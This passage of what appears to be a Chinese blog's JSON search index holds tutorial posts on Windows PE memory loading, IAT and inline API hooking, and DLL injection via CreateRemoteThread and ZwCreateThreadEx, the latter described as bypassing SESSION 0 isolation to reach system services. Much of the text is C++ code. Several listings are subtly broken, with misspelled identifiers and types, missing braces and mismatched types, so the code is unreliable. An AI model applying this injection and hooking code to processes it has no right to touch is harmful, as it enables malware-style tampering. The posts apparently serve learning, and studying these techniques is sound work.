)&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; PELoader_Demo.cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475// PELoader_Demo.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &quot;MmLoadDll.h&quot;int main()&#123; wchar_t szFileName[MAX_PATH] = L&quot;C:\\\\Users\\\\dell\\\\OneDrive\\\\桌面\\\\哔哩哔哩学习\\\\PE Learn\\\\PELoader_Demo\\\\Debug\\\\TestDLL_01.dll&quot;; HANDLE hFile = CreateFile( szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL ); if (INVALID_HANDLE_VALUE == hFile) &#123; printf(&quot;CreateFile Failed: %d\\n&quot;, GetLastError()); return 0; &#125; DWORD dwFileSize = GetFileSize(hFile, NULL); printf(&quot;FileSize: %d\\n&quot;, dwFileSize); // 申请动态内存并读取DLL到内存中 PBYTE lpData = new BYTE[dwFileSize]; if (lpData == NULL) &#123; printf(&quot;申请内存出错: %d\\n&quot;, GetLastError()); return 0; &#125; DWORD dwRet = 0; BOOL bRet = ReadFile(hFile, lpData, dwFileSize, &amp;dwRet, NULL); if (!bRet) &#123; printf(&quot;ReadFile Failed: %d\\n&quot;, GetLastError()); return 0; &#125; printf(&quot;lpData: %08x\\n&quot;, *(short*)lpData); // 将内存DLL加载到程序中 LPVOID lpBaseAddress = MmLoadLibrary(lpData, dwFileSize); if (lpBaseAddress == NULL) &#123; printf(&quot;MmLoadLibrary Failed: %d\\n&quot;, GetLastError()); return 0; &#125; printf(&quot;DLL加载成功\\n&quot;); // 获取DLL导出函数并调用 typedef void (*typedef_ShowMessage)(); const char* szName = &quot;ShowMessage&quot;; typedef_ShowMessage ShowMessage = (typedef_ShowMessage)MmGetProcAddress(lpBaseAddress, (wchar_t*)szName); if (NULL == ShowMessage) &#123; printf(&quot;MmGetProcAddress Failed\\n&quot;); return 0; &#125; ShowMessage(); // 释放从内存加载的DLL BOOL bRet1 = MmFreeLibrary(lpBaseAddress); if (FALSE == bRet1) &#123; printf(&quot;MmFreeLibrary Failed\\n&quot;); return 0; &#125; // 释放 delete[] lpData; lpData = NULL; CloseHandle(hFile); //system(&quot;pause&quot;); return 0;&#125; 调用导出函数调用导出函数 内存加载exe执行待补充… 仓库地址 参考资料参考书籍《Windwos黑客编程技术详解》第4章第3节 参考Blog kn0sky lyshark","categories":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/categories/Windows-PE/"}],"tags":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/tags/Windows-PE/"}]},{"title":"IAT-Hook","slug":"IAT-Hook","date":"2023-05-28T02:05:22.000Z","updated":"2023-05-29T15:34:39.071Z","comments":true,"path":"3aecea41.html","link":"","permalink":"http://example.com/3aecea41.html","excerpt":"IAT HookIMAGE_IMPORT_DESCRIPTOR中两个IMAGE_THUNK_DATA结构体，第一个位导入名称表（INT），第二个位导入地址表（IAT）。两个结构在磁盘文件中时是没有差别的，但是当PE文件被装载到内存中后，FirstThunk字段指向的IMAGE_THUNK_DATA的值会被Windows进行填充。该值为一个RVA，该RVA加上映像基址后，虚拟地址就保存了真正的导入函数的入口地址IAT Hook步骤获取欲Hook的函数地址找到该函数的所保存的IAT地址把IAT中该函数的地址修改为Hook函数的地址","text":"IAT HookIMAGE_IMPORT_DESCRIPTOR中两个IMAGE_THUNK_DATA结构体，第一个位导入名称表（INT），第二个位导入地址表（IAT）。两个结构在磁盘文件中时是没有差别的，但是当PE文件被装载到内存中后，FirstThunk字段指向的IMAGE_THUNK_DATA的值会被Windows进行填充。该值为一个RVA，该RVA加上映像基址后，虚拟地址就保存了真正的导入函数的入口地址IAT Hook步骤获取欲Hook的函数地址找到该函数的所保存的IAT地址把IAT中该函数的地址修改为Hook函数的地址 遍历64位IAT函数名和地址遍历64位IAT函数名和地址GetModuleHandle：参数只有1个，是目标模块名，此处填NULL表示当前进程，返回的是一个进程句柄，也就是当前进程的首地址区别：64位程序的基地址是Unsigned Long Long类型，用DWORD64表示运行中的程序，IAT里记录的是VA而不是RVA运行中的程序，INT里记录的是RVA而不是VA 代码示例12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main() &#123; // 获取当前程序的首地址 HMODULE hModuel = GetModuleHandle(NULL); // 定位DOS头 PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule; // 定位NT头 PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD64)hModule + pDosHeader-&gt;e_lfanew); // 获取导入表RVA DWORD64 dwImportRVA = pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress; // 定位导入表 PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(dwImportRVA + (DWORD64)hModule); while(pImport-&gt;Name) &#123; const char* szDllName = (char*)((DWORD64)hModule + pImport-&gt;Name); printf(&quot;%s\\n&quot;, szDllName); PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)((DWORD64)hModule + pImport-&gt;FirstThunk); PIMAGE_THUNK_DATA pINT = (PIMAGE_THUNK_DATA)((DWORD64)hModule + pImport-&gt;OriginalFirstThunk); if(pIAT-&gt;u1.Oridianl != 0) &#123; while(pIAT-&gt;u1.Function) PIMAGE_IMPORT_BY_NAME pFuncName = (PIMAGE_IMPORT_BY_NAME)((DWORD64)hModule + pINT-&gt;AddressOfData); PDWORD64 dwFuncAddr = (PDWORD64)(pIAT-&gt;Function); printf(&quot;函数名称：%-50s&quot;, pFuncName); printf(&quot;函数地址：%p\\n&quot;, dwFuncAddr); pINT++; pIAT++; &#125; &#125; pImport++; &#125;&#125; Hook CreateFileW代码示例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#include &lt;Windows.h&gt;HANDLEWINAPIMyCreateFileW( _In_ LPCWSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile)&#123; if(MessageBox(NULL, L&quot;打开文件操作被拦截&quot;, L&quot;提示&quot;, MB_YESNO) == IDYES) &#123; return CreateFileW( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile ); &#125; else &#123; MessageBox(NULL, L&quot;文件打开失败&quot;, L&quot;警告&quot;, NULL); return FALSE; &#125;&#125;BOOL IATHook(LPCWSTR lpModuleName, const char* szFuncName)&#123; DWORD64 dwFuncAddr = (DWROD64)GetProcAddress(GetModuleHandle(lpModuleName), szFuncName); // 获取程序基址 HMODULE hModule = GetModuleHandle(NULL); // 定位DOS头 PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule; // 定位NT头 PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD64)hModule + pDosHeader-&gt;e_lfanew); // 获取导入表RVA DWORD64 dwImportRVA = pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress; // 定位导入表 PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD64)hModule + dwImportRVA); while(pImport-&gt;Nmae) &#123; const char* szDllName = (char*)((DWORD64)hModule + pImport-&gt;Name); char szName[MAXBYTE] = &#123; 0 &#125;; strcpy_s(szName, szDllName) if(strcmp(_strlwr(szName), &quot;kernel32.dll&quot;) == 0) &#123; PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((DWORD64)hModule + pImport-&gt;FirstThunk); while(pThunk-&gt;Function) &#123; if(pThunk-&gt;Function == dwFuncAddr) &#123; DWORD64 dwOldProtect; VirtualProtectEx(GetCurrentProcess(), (LPVOID)&amp;pThunk-&gt;Function, 8, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect); pThunk-&gt;Function = (DWORD64)MyCreateFileW; break; &#125; pThunk++; &#125; break; &#125; pImport++; &#125;&#125;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: IATHook(L&quot;kernel32.dll&quot;, L&quot;CreateFileW&quot;); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125;","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"windows Hook","slug":"windows-Hook","permalink":"http://example.com/tags/windows-Hook/"}]},{"title":"Inline Hook","slug":"Inline-Hook","date":"2023-05-21T03:22:04.000Z","updated":"2023-05-27T13:24:14.208Z","comments":true,"path":"1b00de47.html","link":"","permalink":"http://example.com/1b00de47.html","excerpt":"Inline Hook(内联钩子注入)流程构造跳转指令[JMP后的偏移量 &#x3D; 目标地址 - 原地址 - jcc的指令长度]在内存中找到欲HOOK函数地址，并保存欲HOOK位置处的前5个字节将构造的跳转指令写入需HOOK的位置处当被HOOK位置被执行时会转到自己的流程执行如果要执行原来的流程，取消HOOK，还原被修改的字节执行原来的流程继续HOOK住原来的位置","text":"Inline Hook(内联钩子注入)流程构造跳转指令[JMP后的偏移量 &#x3D; 目标地址 - 原地址 - jcc的指令长度]在内存中找到欲HOOK函数地址，并保存欲HOOK位置处的前5个字节将构造的跳转指令写入需HOOK的位置处当被HOOK位置被执行时会转到自己的流程执行如果要执行原来的流程，取消HOOK，还原被修改的字节执行原来的流程继续HOOK住原来的位置 仓库地址 5字节Inline Hook（x86）5字节Inline Hook中jcc指令长度为5根据计算公式：JMP后的偏移量 &#x3D; 目标地址 - 原地址- 5 代码实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980PROC m_FuncAddress; // 要Hook的函数地址BYTE m_OldBytes[5]; // 要Hook函数的头5个字节BYTE m_NewBytes[5]; // 要替换到目标函数头五个字节的新字节（jmp xxxxxxxx/ E9 xxxxxxxx）BOOL Hook(const char* pszModuleName, const char* pszFuncName, PROC pfnHookFunc)&#123; m_FuncAddress = (PROC)GetProcAddress(GetModuleHandle(pszModuleName), pszFuncName); if(m_FuncAddress == NULL) &#123; return FALSE; &#125; SIZE_T dwSize = 0; ReadProcessMemory(GetCurrentProcess(), m_FuncAddress, m_OldBytes, 5, &amp;dwSize); m_NewBytes[0] = &#x27;\\xE9&#x27;; *(DWORD*)(m_NewBytes + 1) = (DWORD)pfnHookFunc - (DWORD)m_FuncAddress - 5; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_NewBytes, 5, &amp;dwSize); return TRUE;&#125;BOOL UnHook()&#123; if (m_FuncAddress != 0) &#123; SIZE_T dwSize = 0; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_OldBytes, 5, &amp;dwSize); &#125; return TRUE;&#125;BOOL ReHook()&#123; if (m_FuncAddress != 0) &#123; SIZE_T dwSize = 0; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_NewBytes, 5, &amp;dwSize); &#125; return TRUE;&#125;intWINAPIMyMessageBoxA( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType)&#123; UnHook(); int nRet = MessageBoxA(hWnd, &quot;Hello Dokey&quot;, &quot;Hello Dokey&quot;, uType); ReHook(); return nRet;&#125;// VA Virtual Address // HMODULE hModule 模块加载基址 ImageBase 模块句柄// DWORD ul_reason_for_call 以什么原因触发的BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: // MessageBox(NULL, &quot;Dokey&quot;, &quot;Dokey&quot;, MB_OK); m_FuncAddress = NULL; memset(m_OldBytes, 0, 5); memset(m_NewBytes, 0, 5); Hook(&quot;user32.dll&quot;, &quot;MessageBoxA&quot;, (PROC)MyMessageBoxA); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: UnHook(); break; &#125; return TRUE;&#125; 7字节Inline Hook（x86）5字节Inline Hook通过构造一个jmp指令来修改目标函数入口的字节内容，jmp指令后面的偏移量是由于CPU机器码要求jmp指令后是一个偏移量7字节Inline Hook通过修改函数入口的两条指令来完成一条是把目标地址存入寄存器eax中: mov eax, xxxxxxxx / B8 xxxxxxxx然后用jmp指令直接跳转到寄存器eax中保存的地址: jmp eax / FF E0通过指令的机器码是不变的，变化的只有地址，需要将目标函数地址保存在从第一至第四字节的位置就可以了Byte bJmpCode[] = {&#39;\\xb8&#39;, &#39;\\0&#39;, &#39;\\0&#39;, &#39;\\0&#39;, &#39;\\0&#39;, &#39;\\xff&#39;, &#39;\\xe0&#39;} 代码实现12345678910111213141516171819202122232425262728293031323334353637383940PROC m_FuncAddress;BYTE m_OldBytes[7];BYTE m_NewBytes[7];BOOL Hook(const char* pszModuleName, const char* pszFuncName, PROC pfnHookFunc)&#123; m_FuncAddress = GetProcAddress(GetModuleHandle(pszModuleName), pszFuncName); if(m_FuncAddress == NULL) &#123; return FALSE; &#125; SIZE_T dwSize = 0; ReadProcessMemory(GetCurrentProcess(), m_FuncAddress, m_OldBytes, 7, &amp;dwSize); m_NewBytes[0] = &#x27;\\xb8&#x27;; m_NewBytes[5] = &#x27;\\xff&#x27;; m_NewBytes[6] = &#x27;\\xe0&#x27;; *(DWORD*)(m_NewBytes + 1) = (DWORD)pfnHookFunc; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_NewBytes, 7, &amp;dwSize); return TRUE;&#125;BOOL UnHook()&#123; if(m_FuncAddress != 0) &#123; SIZE_T dwSize = 0; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_OldBytes, 7, &amp;dwSize); &#125; return TRUE;&#125;BOOL ReHook()&#123; if(m_FuncAddress != 0) &#123; SIZE_T dwSize = 0; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_NewBytes, 7, &amp;dwSize); &#125; return TRUE;&#125; 12字节Inline Hook（x64）原理： mov rax, Address/jmp rax;硬编码： Byte[12] = {0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xe0} 代码实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980PROC m_FuncAddress;BYTE m_OldBytes[12];BYTE m_NewBytes[12];BOOL Hook(const char* pszModulesName, const char* pszFuncName, PROC pfnHookFunc)&#123; m_FuncAddress = GetProcAddress(GetModuleHandle(pszModuleName), pszFuncName); if (m_FuncAddress == NULL) &#123; return FALSE; &#125; SIZE_T dwSize = 0; ReadProcessMemory(GetCurrentProcess(), m_FuncAddress, m_OldBytes, 12, &amp;dwSize); m_NewBytes[0] = &#x27;\\x48&#x27;; m_NewBytes[1] = &#x27;\\xb8&#x27;; m_NewBytes[10] = &#x27;\\xff&#x27;; m_NewBytes[11] = &#x27;\\xe0&#x27;; *(DWORD64*)(m_NewBytes + 2) = (DWORD64)pfnHookFunc; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_NewBytes, 12, &amp;dwSize); return TRUE;&#125;BOOL UnHook()&#123; if(m_FuncAddress == 0) &#123; return FALSE; &#125; SITE_T dwSize = 0; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_OldBytes, 12, &amp;dwSize); return TRUE;&#125;BOOL ReHook()&#123; if(m_FuncAddress == 0) &#123; return FALSE; &#125; SIZTE_T dwSize = 0; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_NewBytes, 12, &amp;dwSize);&#125;intWINAPIMyMessageBoxA( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType)&#123; UnHook(); int nRet = MessageBoxA(hWnd, &quot;Dokey 12&quot;, &quot;Dokey 12&quot;, uType); ReHook(); return nRet;&#125;intWINAPIMyMessageBoxW( _In_opt_ HWND hWnd, _In_opt_ LPCWSTR lpText, _In_opt_ LPCWSTR lpCaption, _In_ UINT uType)&#123; UnHook(); int nRet = MessageBoxW(hWnd, L&quot;Dokey 12&quot;, L&quot;Dokey 12&quot;, uType); ReHook(); return nRet;&#125;#ifdef UNICODE#define MyMessageBox MyMessageBoxWconstexpr auto MessageBoxText = &quot;MessageBoxW&quot;;#else#define MyMessageBox MyMessageBoxAconstexpr auto MessageBoxText = &quot;MessageBoxA&quot;;#endif // !UNICODE...","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"windows Hook","slug":"windows-Hook","permalink":"http://example.com/tags/windows-Hook/"}]},{"title":"远程线程注入","slug":"远程线程注入","date":"2023-05-17T13:46:55.000Z","updated":"2023-05-28T02:23:25.367Z","comments":true,"path":"cf459526.html","link":"","permalink":"http://example.com/cf459526.html","excerpt":"远程线程注入是指一个进程在另一个进程中创建线程的技术。是一种病毒木马所青睐的注入技术。","text":"远程线程注入是指一个进程在另一个进程中创建线程的技术。是一种病毒木马所青睐的注入技术。 CreateRemoteThread 远程线程注入OpenProcess 函数 打开现有的本地进程对象 1234567HANDLEWINAPIOpenProcess( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId ); OpenProcessdwDesiredAccess: 访问进程对象。此访问权限为针对进程的安全描述符进行检查，此参数可以是一个或多个进程访问权限。bInheritHandle: 此进程创建的进程是否可以继承该句柄dwProcessId: 要打开的本地进程PID如果函数成功，则返回值是打开指定进程的句柄如果函数失败，则返回值为NULL VirtualAllocEx 函数 在指定进程的虚拟地址空间内保留、提交或更改内存状态 123456789LPVOIDWINAPIVirtualAllocEx( _In_ HANDLE hProcess, _In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect ); VirtualAllocExhProcess: 进程句柄。此函数在该进程的虚拟地址空间内分配内存，句柄必须具有PROCESS_VM_OPERATION权限lpAddress: 指定要分配页面所需起始地址的指针。如果lpAddress为NULL，则该函数自动分配内存dwSize: 要分配内存大小，以字节为单位flAllocationType: 内存分配类型。此参数必须为以下值之一值含义MEM_COMMIT在磁盘分页和整体内存中，为指定预留内存页分配内存MEM_RESERVE保留进程中虚拟地址空间的范围，但不会在磁盘或内存上的分页文件中分配任何实际物理存储位置MEM_RESET表示不再关注由lpAddress和dwSize指定的内存范围内的数据，页面不应从页面文件中读取或写入MEM_RESET_UNDO只能在早期成功应用了MEM_RESET的地址范围内调用MEM_RESET_UNDOflProtect: 要分配的页面区域的内存保护。如果页面已提交，则可以指定任何一个内存保护常量。如果lpAddress指定了一个地址，则flProtect不能是以下值之一PAGE_NOACCESSPAGE_GUARDPAGE_NOCACHEPAGE_WRITECOMBINE如果函数成功，则返回值是分配页面的基址如果函数失败，则返回值为NULL WriteProcessMemory 函数 在指定进程中将数据写入内存区域，要写入的整个区域必须可访问，否则操作失败 123456789BOOLWINAPIWriteProcessMemory( _In_ HANDLE hProcess, _In_ LPVOID lpBaseAddress, _In_reads_bytes_(nSize) LPCVOID lpBuffer, _In_ SIZE_T nSize, _Out_opt_ SIZE_T* lpNumberOfBytesWritten ); WriteProcessMemoryhProcess: 要修改的进程内存句柄。句柄必须具有PROCESS_VM_WRITE 和 PROCESS_VM_OPERATION访问权限lpBaseAddress: 指向指定进程中写入数据的基地址指针。在数据传输之前，系统会验证指定大小的基地址和内存中的所有数据是否可以进行写入访问，如果不可以访问，则该函数将失败lpBuffer: 指向缓冲区指针。其中包含要写入指定进程的地址空间中的数据nSize: 要写入指定进程的字节数lpNumberOfBytesWritten: 指向变量指针，该变量接收传输到指定进程的字节数。如果lpNumberOfBytesWritten为NULL，则忽略该参数如果函数成功，则返回值不为零如果函数失败，则返回值为零 CreateRemoteThread 函数 在另一个进程的虚拟地址空间中创建运行的线程 1234567891011HANDLEWINAPICreateRemoteThread( _In_ HANDLE hProcess, _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId ); CreateRemoteThreadhProcess: 要创建线程的进程句柄。句柄必须具有PROCESS_CREATE_THREAD、PROCESS_QUERY_INFORMATION、PROCESS_VM_OPERATION、PROCESS_VM_WRITE和PEOCESS_VM_READ访问权限lpThreadAttributes: 指向SECURITY_ATTRIBUTES结构的指针，该结构指定新线程的安全描述符，并确定子进程是否可以继承返回的句柄。如果lpThreadAttributes为NULL，则线程将获得默认的安全描述符，并且不能继承该句柄dwStackSize: 堆栈的初始化大小，以字节为单位。如果此参数为0，则新线程使用可执行文件的默认大小lpStartAddress: 指向由线程执行类型为LPTHREAD_START_ROUTINE的应用程序定义的函数指针，并表示远程进程中线程的起始地址，该函数必须存在于远程进程中lpParameter: 指向要传递给线程函数的变量指针dwCreationFlags: 控制线程创建的标志，若是0，则表示线程在创建后立即执行lpThreadId: 指向接收线程标识符的变量指针。如果此参数为NULL，则不返回线程标识符如果函数成功，则返回值是新线程的句柄如果函数失败，则返回值为NULL 远程线程注入代码实现1234567891011121314151617181920212223242526272829BOOL Inject(DWORD dwPid, const WCHAR* szPath)&#123; // 打开进程 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); // 申请内存 LPVOID lpAddress = VirtualAllocEx(hProcess, NULL, 0x100, MEM_CONMIT | MEM_RESERVE, PAGE_READWRITE); if (lpAddress == 0) &#123; printf(&quot;VirtualAllocEx Failed&quot;); return FALSE; &#125; // 把动态链接库写入到目标内存中 SIZE_T szWriteLength = 0; WriteProcessMemory(hProcess, lpAddress, szPath, ((wcslen(szPath) + 1) * 2), &amp;szWrithLength); // 创建远程线程，把LoadLibrary作为回调函数，并且把刚才的地址作为参数进行调用 HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryA, lpAddress, NULL, NULL); if (hThread == 0) &#123; printf(&quot;CreateRemoteThread Failed&quot;); return FALSE; &#125; // 等待线程执行结束 WaitForSingleObject(hThread, -1); // 清理、释放空间 VirtualFreeEx(hProcess, lpAddress, 0, MEM_RELEASE); CloseHandle(hProcess); CloseHandle(hThread); return TRUE;&#125; ZwCreateThreadEx 突破 SESSION 0 隔离的远程线程注入 与传统的CreateRemoteThread函数实现的远程线程注入DLL的唯一区别在于，突破SESSION 0远程线程注入是使用比CreateRemoteThred函数更为底层的ZwCreateThreadEx函数来创建远程线程。ZwCreateThreadEx函数可以突破SESSION 0隔离，将DLL成功注入到SESSION 0隔离的系统服务进程中。其中ZwCreateThreadEx在ntdll.dll中并没有声明，所以需要使用GetProcAddress从ntdll.dll中获取该函数的导出地址 函数声明64位系统下函数声明 12345678910111213DWORD WINAPI ZwCreateThreadEx( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown) 32位系统下函数声明 12345678910111213DWORD WINAPI ZwCreateThreadEx( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown) ZwCreateThreadEx 注入代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134BOOL ZwCreateThreadExInjectDll(DWORD dwPid, char* szDllPath)&#123; // 打开进程句柄 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); if(hProcess == NULL) &#123; printf(&quot;OpenProcess Failed\\n&quot;); return FALSE; &#125; // 在目标进程申请内存 DWORD dwSize = 1 + lstrlen(szDllPath); LPVOID lpDllAddress = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE); // 将数据写入目标进程 if (FALSE == WriteProcessMemory(hProcess, lpDllAddress, szDllPath, dwSize, NULL)) &#123; printf(&quot;WriteProcessMemory Failed\\n&quot;); return FALSE; &#125;#ifdef _WIN64 typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown);#else typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown);#endif // 获取ntdll.dll HMODULE hNtDll = LoadLibrary(&quot;ntdll.dll&quot;); if(hNtDll == NULL) &#123; printf(&quot;Load ntdll Failed\\n&quot;); return FALSE; &#125; // 获取LoadLibrary地址 FARPROC pFuncProcAddr = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); if(pFuncProcAddr == NULL) &#123; printf(&quot;Get LoadLibrary Failed\\n&quot;); return FALSE; &#125; // 获取ZwCreateThreadEx地址 typedef_ZwCreateThreadEx zwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtDll, &quot;ZwCreateThreadEx&quot;); HANDLE hRemoteThread = 0; DWORD dwZwCreateThreadEx = zwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, lpDllAddress, 0, 0, 0, 0, NULL); if(hRemoteThread == NULL) &#123; printf(&quot;zwCreateThreadEx Failed\\n&quot;); return FALSE; &#125; // 关闭句柄 VirtualFreeEx(hProcess, lpDllAddress, 0, MEM_RELEASE); CloseHandle(hProcess); CloseHandle(hRemoteThread); return TRUE;&#125;// OpenProcess打开高权限的进程需要提权BOOL EnablePrivileges(HANDLE hProcess, const char* pszPrivilegesName)&#123; HANDLE hToken = NULL; LUID luidValue = &#123; 0 &#125;; TOKEN_PRIVILEGES tokenPrivileges = &#123; 0 &#125;; BOOL bRet = FALSE; DWORD dwRet = 0; // 打开进程令牌并获取进程令牌句柄 bRet = ::OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &amp;hToken); if (FALSE == bRet) &#123; printf(&quot;OpenProcessToken&quot;); return FALSE; &#125; // 获取本地系统的 pszPrivilegesName 特权的LUID值 bRet = ::LookupPrivilegeValue(NULL, pszPrivilegesName, &amp;luidValue); if (FALSE == bRet) &#123; printf(&quot;LookupPrivilegeValue&quot;); return FALSE; &#125; // 设置提升权限信息 tokenPrivileges.PrivilegeCount = 1; tokenPrivileges.Privileges[0].Luid = luidValue; tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; // 提升进程令牌访问权限 bRet = ::AdjustTokenPrivileges(hToken, FALSE, &amp;tokenPrivileges, 0, NULL, NULL); if (FALSE == bRet) &#123; printf(&quot;AdjustTokenPrivileges&quot;); return FALSE; &#125; else &#123; // 根据错误码判断是否特权都设置成功 dwRet = ::GetLastError(); if (ERROR_SUCCESS == dwRet) &#123; printf(&quot;SUCCESS!!\\n&quot;); return TRUE; &#125; else if (ERROR_NOT_ALL_ASSIGNED == dwRet) &#123; printf(&quot;ERROR_NOT_ALL_ASSIGNED&quot;); return FALSE; &#125; &#125; return FALSE;&#125;int main()&#123; HANDLE hProcess = GetCurrentProcess(); EnablePrivileges(hProcess, SE_DEBUG_NAME); const char* szDllPath = &quot;C:\\\\Users\\\\dell\\\\OneDrive\\\\桌面\\\\Dll1.dll&quot;; ZwCreateThreadExInjectDll(1364, szDllPath); system(&quot;pause&quot;); return 0;&#125; 卸载被注入的DLL文件FreeLibrary 函数12345BOOLWINAPIFreeLibrary( _In_ HMODULE hLibModule // dll 模块句柄 ); FreeLibraryFreeLibrary函数使用的模块句柄可以通过前面介绍的Module32First和Module32Next两个函数获取，需要用到MODULEENTRY32结构体 12345678910111213typedef struct tagMODULEENTRY32&#123; DWORD dwSize; DWORD th32ModuleID; // This module DWORD th32ProcessID; // owning process DWORD GlblcntUsage; // Global usage count on the module DWORD ProccntUsage; // Module usage count in th32ProcessID&#x27;s context BYTE * modBaseAddr; // Base address of module in th32ProcessID&#x27;s context DWORD modBaseSize; // Size in bytes of module starting at modBaseAddr HMODULE hModule; // The hModule of this module in th32ProcessID&#x27;s context char szModule[MAX_MODULE_NAME32 + 1]; char szExePath[MAX_PATH];&#125; MODULEENTRY32; MODULEENTRY32hModule: 模块句柄szModule: 